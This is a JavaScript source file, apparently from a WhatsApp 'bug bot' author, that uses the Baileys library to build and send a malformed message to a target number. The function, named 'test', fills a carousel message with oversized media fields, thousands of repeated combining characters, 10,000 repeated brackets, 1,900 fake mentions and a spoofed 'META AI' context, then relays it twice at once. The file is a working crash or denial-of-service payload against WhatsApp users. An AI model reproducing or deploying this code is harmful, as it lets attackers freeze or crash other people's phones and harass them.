/*
 * © 2026 Zamiwolf (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@zami-tech001?si=KZyqSwioU8lh14jh
 * Instagram : itx_zami
 * Telegram  : https://t.me/ZAMI_WOLF_001
 * WhatsApp  : +923165451863
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */


const { default: makeSYxS7, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto')

async function test(SYxS7, target) {
  const cardss = [];

  for (let i = 0; i < 30; i++) {
    cardss.push({
      header: {
        hasMediaAttachment: true,
        productMessage: {
          product: {
            productImage: {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
    fileLength: "999999999999999",
    height: 9999,
    width: 9999,
    mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
    fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
    directPath: "/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1755695348",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
  },
            productId: "9783476898425051",
            title: "σƭαא ɦεɾε" + "ꦽ".repeat(500),
            description: "ꦽ".repeat(500),
            currencyCode: "IDR",
            priceAmount1000: "X",
            retailerId: "BAN011",
            productImageCount: 2,
            salePriceAmount1000: "50000000"
          },
          businessOwnerJid: "6287875400190@s.whatsapp.net",     
        }
      },
      body: { text: "LOVE U" + "ꦽ".repeat(5000) },
      nativeFlowMessage: {
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "RIVIEW",
              flow_cta: "ꦽ".repeat(1000),
              flow_message_version: "3"
            })
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "PROMOTION",
              flow_cta: "ꦽ".repeat(1000),
              flow_message_version: "3"
            })
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "DOCUMENT",
              flow_cta: "ꦽ".repeat(1000),
              flow_message_version: "3"
            })
          }
        ],
        messageParamsJson: "{[".repeat(10000)
      }
    });
  }

  const content = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
        contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            remoteJid: "X",
            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot"
              }
            }
          },
          carouselMessage: {
            messageVersion: 1,
            cards: cardss
          }
        }
      }
    }
  };

  const [janda1, janda2] = await Promise.all([
    SYxS7.relayMessage(target, content, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    SYxS7.relayMessage(target, content, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);
}


module.exports = { test };